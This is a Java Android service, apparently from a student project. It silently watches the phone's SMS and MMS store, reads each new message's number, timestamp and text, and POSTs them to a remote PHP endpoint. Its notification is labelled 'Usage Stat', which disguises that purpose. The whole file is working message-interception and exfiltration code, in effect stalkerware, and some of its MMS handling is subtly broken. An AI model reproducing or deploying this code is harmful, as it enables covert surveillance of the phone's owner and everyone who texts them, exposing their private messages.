package uk.ac.rgu.lab04.honours;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;

import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.Date;


public class ListenSmsMmsService extends Service {

    private ContentResolver contentResolver;

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onCreate() {
        startForeground(5, getNotification());
    }

    private Notification getNotification() {
        NotificationChannel channel = null;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            channel = new NotificationChannel("usageStatService", "Usage Stat", NotificationManager.IMPORTANCE_DEFAULT);
        }

        NotificationManager notificationManager = getSystemService(NotificationManager.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            notificationManager.createNotificationChannel(channel);
        }

        Notification.Builder builder = null;
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
            builder = new Notification.Builder(getApplicationContext(), "usageStatService").setAutoCancel(true);
        }
        return builder.build();
    }

    public void registerObserver() {

        contentResolver = getContentResolver();
        contentResolver.registerContentObserver(
                Uri.parse("content://mms-sms/complete-conversations/"),
                true, new SMSObserver(new Handler()));
    }

    //start the service and register observer for lifetime
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        super.onStartCommand(intent, flags, startId);
        registerObserver();

        return START_STICKY;
    }


    class SMSObserver extends ContentObserver{
        SMSObserver(Handler handler) {
            super(handler);

        }

        //will be called when database get change
        @Override
        public void onChange(boolean selfChange) {
            super.onChange(selfChange);

            /*first of all we need to decide message is Text or MMS type.*/
            final String[] projection = new String[]{
                    "_id", "ct_t"};
            Uri mainUri = Uri.parse(
                    "content://mms-sms/complete-conversations/");
            Cursor mainCursor = contentResolver.
                    query(mainUri, projection,
                            null, null, null);
            assert mainCursor != null;
            mainCursor.moveToFirst();

            String msgContentType = mainCursor.getString(mainCursor.
                    getColumnIndex("ct_t"));
            if ("application/vnd.wap.multipart.related".
                    equals(msgContentType)) {
                // it's MMS

                //now we need to decide MMS message is sent or received
                Uri mUri = Uri.parse("content://mms");
                Cursor mCursor = contentResolver.query(mUri, null, null,
                        null, null);
                mCursor.moveToNext();
                int type = mCursor.getInt(mCursor.getColumnIndex("type"));

                if(type==1){
                    //it's received MMS
                    getReceivedMMSInfo();
                }
                else if(type==2)
                {
                    //it's sent MMS
                    getSentMMSInfo();
                }

            }
            else{
                // it's SMS

                //now we need to decide SMS message is sent or received
                Uri mUri = Uri.parse("content://sms");
                Cursor mCursor = contentResolver.query(mUri, null, null,
                        null, null);
                assert mCursor != null;
                mCursor.moveToNext();
                int type = mCursor.getInt(mCursor.getColumnIndex("type"));

                if(type==1){
                    //it's received SMS
                    getReceivedSMSInfo();
                }
                else if(type==2)
                {
                    //it's sent SMS
                    getSentSMSInfo();
                }
            }//message content type block closed


        }//on changed closed


        /*now Methods start to getting details for sent-received SMS*/


        //method to get details about received SMS
        private void getReceivedSMSInfo() {
            Uri uri = Uri.parse("content://sms/inbox");
            Cursor cursor = contentResolver.query(uri, null,
                    null,null, null);
            assert cursor != null;
            cursor.moveToNext();

            // 1 = Received, etc.
            int type = cursor.getInt(cursor.
                    getColumnIndex("type"));
            String msg_id= cursor.getString(cursor.
                    getColumnIndex("_id"));
            String phone = cursor.getString(cursor.
                    getColumnIndex("address"));
            String dateVal = cursor.getString(cursor.
                    getColumnIndex("date"));
            String body = cursor.getString(cursor.
                    getColumnIndex("body"));
            Date date = new Date(Long.valueOf(dateVal));

            sendToServer(type, msg_id, phone, body, String.valueOf(date.getTime()),"0");
        }


        //method to get details about Sent SMS
        private void getSentSMSInfo() {
            Uri uri = Uri.parse("content://sms/sent");
            Cursor cursor = contentResolver.query(uri, null,
                    null, null, null);
            assert cursor != null;
            cursor.moveToNext();

            // 2 = sent, etc.
            int type = cursor.getInt(cursor.
                    getColumnIndex("type"));
            String msg_id= cursor.getString(cursor.
                    getColumnIndex("_id"));
            String phone = cursor.getString(cursor.
                    getColumnIndex("address"));
            String dateVal = cursor.getString(cursor.
                    getColumnIndex("date"));
            String body = cursor.getString(cursor.
                    getColumnIndex("body"));
            Date date = new Date(Long.valueOf(dateVal));

            sendToServer(type, msg_id, phone, body,String.valueOf(date.getTime()),"1");
        }



        /*now Methods start to getting details for sent-received MMS.*/


        // method to get details about Received (inbox)  MMS
        private void getReceivedMMSInfo() {
            Uri uri = Uri.parse("content://mms/inbox");
            Cursor cursor = getContentResolver().query(uri, null,null,
                    null, null);
            assert cursor != null;
            cursor.moveToNext();

            String mms_id= cursor.getString(cursor.
                    getColumnIndex("_id"));
            String phone = cursor.getString(cursor.
                    getColumnIndex("address"));
            String dateVal = cursor.getString(cursor.
                    getColumnIndex("date"));
            Date date = new Date(Long.valueOf(dateVal));

            // 2 = sent
            int mtype = cursor.getInt(cursor.
                    getColumnIndex("type"));

            String body="";

            String type = cursor.getString(cursor.
                    getColumnIndex("ct"));
            if ("text/plain".equals(type)){
                String data = cursor.getString(cursor.
                        getColumnIndex("body"));
                if(data != null){
                    body = getReceivedMmsText(mms_id);
                }
                else {
                    body = cursor.getString(cursor.
                            getColumnIndex("text"));
                    //body text is stored here
                }
            }

            sendToServer(mtype, mms_id, phone, body, String.valueOf(date.getTime()),"1");
        }


        //method to get Text body from Received MMS
        private String getReceivedMmsText(String id) {
            Uri partURI = Uri.parse("content://mms/inbox" + id);
            StringBuilder sb = new StringBuilder();
            try (InputStream is = getContentResolver().openInputStream(partURI)) {
                if (is != null) {
                    InputStreamReader isr = new InputStreamReader(is,
                            StandardCharsets.UTF_8);
                    BufferedReader reader = new BufferedReader(isr);
                    String temp = reader.readLine();
                    while (temp != null) {
                        sb.append(temp);
                        temp = reader.readLine();
                    }
                }
            } catch (IOException ignored) {
            }
            return sb.toString();
        }


        // methods to get details about Sent MMS
        private void getSentMMSInfo() {


            Uri uri = Uri.parse("content://mms/sent");
            Cursor cursor = getContentResolver().query(uri,
                    null,null,
                    null, null);
            assert cursor != null;
            cursor.moveToNext();

            String mms_id= cursor.getString(cursor.
                    getColumnIndex("_id"));
            String phone = cursor.getString(cursor.
                    getColumnIndex("address"));
            String dateVal = cursor.getString(cursor.
                    getColumnIndex("date"));
            Date date = new Date(Long.valueOf(dateVal));
            // 2 = sent, etc.
            int mtype = cursor.getInt(cursor.
                    getColumnIndex("type"));
            String body="";

            String type = cursor.getString(cursor.
                    getColumnIndex("ct"));
            if ("text/plain".equals(type)){
                String data = cursor.getString(cursor.
                        getColumnIndex("body"));
                if(data != null){
                    body = getSentMmsText(mms_id);
                }
                else {
                    body = cursor.getString(cursor.
                            getColumnIndex("text"));
                    //body text is stored here
                }
            }

            sendToServer(mtype, mms_id, phone, body, String.valueOf(date.getTime()),"0");

        }

        //method to get Text body from Sent MMS
        private String getSentMmsText(String id) {

            Uri partURI = Uri.parse("content://mms/sent" + id);
            StringBuilder sb = new StringBuilder();
            try (InputStream is = getContentResolver().openInputStream(partURI)) {
                if (is != null) {
                    InputStreamReader isr = new InputStreamReader(is,
                            StandardCharsets.UTF_8);
                    BufferedReader reader = new BufferedReader(isr);
                    String temp = reader.readLine();
                    while (temp != null) {
                        sb.append(temp);
                        temp = reader.readLine();
                    }
                }
            } catch (IOException ignored) {
            }
            return sb.toString();

        }

        //send data to server
        private void sendToServer(int type, String msg_id, String phone, String body, String date,String action) {
            if (!Constants.checkLastSmsId(getApplicationContext(),msg_id, String.valueOf(type))) {
                Constants.setLastSmsId(getApplicationContext(),msg_id, String.valueOf(type));
                if (phone.startsWith("+")){
                    phone="0"+phone.substring(3);
                }
                insertData(Constants.getPrivateKey(getApplicationContext()),date,phone,body,action);
            }
        }
    }


    public static void insertData(final String key, final String date, final String address, final String message, final String action){

        class SendPostReqAsyncTask extends AsyncTask<String, Void, String> {
            @Override
            protected void onPreExecute() {
                super.onPreExecute();
            }

            @Override
            protected String doInBackground(String... params) {
                String reg_url=Constants.URL_SERVER+"insert/insertSms.php";
                String key=params[0];
                String date=params[1];
                String address=params[2];
                String message=params[3];
                String action=params[4];
                try {
                    URL url = new URL(reg_url);
                    HttpURLConnection httpURLConnection =
                            (HttpURLConnection)url.openConnection();
                    httpURLConnection.setRequestMethod("POST");
                    httpURLConnection.setDoOutput(true);
                    OutputStream OS = httpURLConnection.getOutputStream();
                    BufferedWriter bufferedWriter = new BufferedWriter(new
                            OutputStreamWriter(OS, StandardCharsets.UTF_8));
                    String data= URLEncoder.encode("key","UTF-8")+"="+URLEncoder.encode(key,"UTF-8")
                            +"&"+URLEncoder.encode("date","UTF-8")+"="+URLEncoder.encode(date,"UTF-8")
                            +"&"+URLEncoder.encode("action","UTF-8")+"="+URLEncoder.encode(action,"UTF-8")
                            +"&"+URLEncoder.encode("address","UTF-8")+"="+URLEncoder.encode(address,"UTF-8")
                            +"&"+URLEncoder.encode("message","UTF-8")+"="+URLEncoder.encode(message,"UTF-8");
                    bufferedWriter.write(data);
                    bufferedWriter.flush();
                    bufferedWriter.close();
                    OS.close();
                    InputStream IS = httpURLConnection.getInputStream();
                    IS.close();
                    return "Registration Success!!";
                } catch (IOException e){
                    e.printStackTrace();
                }
                return null;
            }

            @Override
            protected void onProgressUpdate(Void... values) {
                super.onProgressUpdate(values);
            }
        }

        SendPostReqAsyncTask sendPostReqAsyncTask = new SendPostReqAsyncTask();

        sendPostReqAsyncTask.execute(key,date,address,message,action);
    }
}